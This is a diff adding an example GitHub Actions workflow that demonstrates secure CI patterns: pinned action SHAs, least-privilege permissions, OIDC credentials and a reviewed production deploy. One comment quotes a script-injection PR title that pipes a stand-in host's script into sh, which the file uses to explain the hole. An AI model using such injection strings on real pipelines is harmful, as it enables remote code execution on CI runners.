@@ -1,0 +1,76 @@
+---
+# =============================================================================
+# Example workflow demonstrating the DevBox GitHub Actions patterns.
+# Copy into .github/workflows/ and adapt.
+# =============================================================================
+name: example
+
+"on":
+  push:
+    branches: [main]
+  pull_request:
+    branches: [main]
+  workflow_dispatch:
+
+# Least privilege at the workflow level, widened per job only where needed.
+permissions:
+  contents: read
+
+# Superseded runs are cancelled rather than left burning minutes.
+concurrency:
+  group: example-${{ github.ref }}
+  cancel-in-progress: true
+
+jobs:
+
+  validate:
+    runs-on: ubuntu-24.04          # pinned, not `ubuntu-latest`
+    timeout-minutes: 10            # every job gets one
+    steps:
+      # Third-party actions pinned to a full commit SHA. The version comment is
+      # for humans; the SHA is what actually gets fetched.
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+
+      # SAFE: no untrusted input reaches the shell.
+      - name: run checks
+        run: |
+          make lint
+          make validate
+
+      # Untrusted input goes through `env:`, never into the shell directly.
+      # Writing `${{ github.event.pull_request.title }}` inside `run:` would be
+      # a script injection: a PR titled `"; curl evil.sh | sh; #` executes.
+      - name: log the PR title safely
+        if: github.event_name == 'pull_request'
+        env:
+          PR_TITLE: ${{ github.event.pull_request.title }}
+        run: |
+          printf 'PR title: %s\n' "$PR_TITLE"
+
+  deploy:
+    needs: validate
+    if: github.ref == 'refs/heads/main'
+    runs-on: ubuntu-24.04
+    timeout-minutes: 20
+    # An environment gives you a required-reviewer gate on the deploy itself.
+    environment: production
+    permissions:
+      contents: read
+      id-token: write              # OIDC — no long-lived cloud credential
+    steps:
+      - uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683 # v4.2.2
+
+      # Federated, short-lived credentials. No AWS_SECRET_ACCESS_KEY anywhere.
+      - name: assume a role via OIDC
+        uses: aws-actions/configure-aws-credentials@b47578312673ae6fa5b5096b330d9fbac3d116df # v4.2.1
+        with:
+          role-to-assume: arn:aws:iam::123456789012:role/github-deploy
+          aws-region: us-east-1
+
+      - name: plan
+        run: terraform plan -input=false
+
+      # NOTE: `terraform apply` is intentionally absent. In this repo's policy it
+      # is APPROVAL_REQUIRED — the `environment: production` gate above is what
+      # makes an automated apply reviewable, and it should be a separate,
+      # explicitly-approved job.
